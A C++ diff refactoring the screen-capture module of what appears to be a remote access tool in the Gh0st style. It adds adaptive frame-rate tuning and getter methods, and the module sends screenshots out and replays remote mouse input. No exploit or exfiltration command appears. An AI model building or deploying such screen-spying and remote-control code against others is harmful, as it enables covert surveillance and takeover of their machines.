@@ -28,7 +28,7 @@ CScreenManager::CScreenManager(IOCPClient* ClientObject, int n):CManager(ClientO
 
 	m_ScreenSpyObject = new CScreenSpy(16);
 
-	szBuffer = new char[4 * m_ScreenSpyObject->m_ulFullWidth * m_ScreenSpyObject->m_ulFullHeight];
+	szBuffer = new char[4 * m_ScreenSpyObject->GetWidth() * m_ScreenSpyObject->GetHeight()];
 
 	m_hWorkThread = CreateThread(NULL,0,(LPTHREAD_START_ROUTINE)WorkThreadProc,this,0,NULL);
 }
@@ -53,8 +53,11 @@ DWORD WINAPI CScreenManager::WorkThreadProc(LPVOID lParam)
 	const int fps = 8;// 帧率
 #endif
 	const int sleep = 1000 / fps;// 间隔时间（ms）
-	int c1 = 0, c2 = 0, s0 = sleep;
+	int c1 = 0; // 连续耗时长的次数
+	int c2 = 0; // 连续耗时短的次数
+	int s0 = sleep; // 两帧之间隔（ms）
 	const int frames = fps;	// 每秒调整屏幕发送速度
+	const double alpha = 1.2; // 控制fps的因子
 	timeBeginPeriod(1);
 	while (This->m_bIsWorking)
 	{
@@ -64,23 +67,23 @@ DWORD WINAPI CScreenManager::WorkThreadProc(LPVOID lParam)
 		{
 			int span = s0-(clock() - last);
 			Sleep(span > 0 ? span : 1);
-			if (span < 0)
+			if (span < 0) // 发送数据耗时较长，网络较差或数据较多
 			{
 				c2 = 0;
-				if (frames == ++c1) {
-					s0 = (s0 <= sleep*4) ? s0*2 : s0;
+				if (frames == ++c1) { // 连续一定次数耗时长
+					s0 = (s0 <= sleep*4) ? s0*alpha : s0;
 					c1 = 0;
 #ifdef _DEBUG
-					printf("[+]SendScreen Span= %dms, s0= %d\n", span, s0);
+					printf("[+]SendScreen Span= %dms, s0= %d, fps= %f\n", span, s0, 1000./s0);
 #endif
 				}
-			} else {
+			} else if (span > 0){ // 发送数据耗时比s0短，表示网络较好或数据包较小
 				c1 = 0;
-				if (frames == ++c2) {
-					s0 = (s0 >= sleep/4) ? s0/2 : s0;
+				if (frames == ++c2) { // 连续一定次数耗时短
+					s0 = (s0 >= sleep/4) ? s0/alpha : s0;
 					c2 = 0;
 #ifdef _DEBUG
-					printf("[-]SendScreen Span= %dms, s0= %d\n", span, s0);
+					printf("[-]SendScreen Span= %dms, s0= %d, fps= %f\n", span, s0, 1000./s0);
 #endif
 				}
 			}
@@ -97,7 +100,7 @@ DWORD WINAPI CScreenManager::WorkThreadProc(LPVOID lParam)
 VOID CScreenManager::SendBitMapInfo()
 {
 	//这里得到bmp结构的大小
-	ULONG   ulLength = 1 + m_ScreenSpyObject->GetBISize();
+	const ULONG   ulLength = 1 + sizeof(BITMAPINFOHEADER);
 	LPBYTE	szBuffer = (LPBYTE)VirtualAlloc(NULL, 
 		ulLength, MEM_COMMIT, PAGE_READWRITE);
 
@@ -279,10 +282,10 @@ VOID CScreenManager::ProcessCommand(LPBYTE szBuffer, ULONG ulLength)
 				POINT Point;
 				Point.x = LOWORD(Msg->lParam);
 				Point.y = HIWORD(Msg->lParam);
-				if(m_ScreenSpyObject->m_bZoomed)
+				if(m_ScreenSpyObject->IsZoomed())
 				{
-					Point.x *= m_ScreenSpyObject->m_wZoom;
-					Point.y *= m_ScreenSpyObject->m_hZoom;
+					Point.x *= m_ScreenSpyObject->GetWZoom();
+					Point.y *= m_ScreenSpyObject->GetHZoom();
 				}
 				SetCursorPos(Point.x, Point.y);
 				SetCapture(WindowFromPoint(Point));
